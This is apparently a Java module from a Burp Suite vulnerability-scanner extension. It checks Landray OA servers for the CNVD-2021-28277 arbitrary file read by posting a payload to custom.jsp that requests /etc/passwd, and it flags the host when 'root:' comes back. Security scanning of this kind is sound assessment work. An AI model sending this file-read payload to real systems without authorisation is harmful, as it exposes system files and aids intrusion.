package burp.vuls.oa.landray;

import burp.*;
import burp.impl.VulTaskImpl;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;
import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.util.List;

public class LandrayOa extends VulTaskImpl {
    /**
     * CNVD-2021-28277
     * 蓝凌oa任意文件读取
     * https://www.cnvd.org.cn/flaw/show/CNVD-2021-28277
     *
     */

    public static VulTaskImpl getInstance(IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, List<BurpExtender.LogEntry> log){
        return new LandrayOa(helpers, callbacks, log);
    }
    private LandrayOa(IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, List<BurpExtender.LogEntry> log) {
        super(helpers, callbacks, log);
    }

    @Override
    public void run() {
        //新的请求包
        url = iHttpService.getProtocol() + "://" + iHttpService.getHost() + ":" + iHttpService.getPort() + "/sys/ui/extend/varkind/custom.jsp";
        String poc_body = "var={\"body\":{\"file\":\"file:///etc/passwd\"}}";
        //新请求
        okHttpRequester.send(url, method, request_header_list, query, poc_body, contentYtpe, new LandrayOaCallback(this));
        BurpExtender.vulsChecked.add("burp.vuls.oa.landray.LandrayOa" + host + iHttpService.getPort()); //添加检测标记
    }
}

class LandrayOaCallback implements Callback {

    VulTaskImpl vulTask;

    public LandrayOaCallback(VulTaskImpl vulTask){
        this.vulTask = vulTask;
    }
    @Override
    public void onFailure(@NotNull Call call, @NotNull IOException e) {
        vulTask.callbacks.printError("[LandrayOaCallback-onFailure] " + e.getMessage() + "\n" + vulTask.request_info);
    }

    @Override
    public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
        if (response.isSuccessful()){
            vulTask.setOkhttpMessage(call, response); //保存okhttp的请求响应信息
            // 检查响应体是否有内容
            if (vulTask.ok_respBody.contains("root:")) {
                vulTask.message = "LandrayOa-RadeAny";
                vulTask.log(call);
            }
        }
    }
}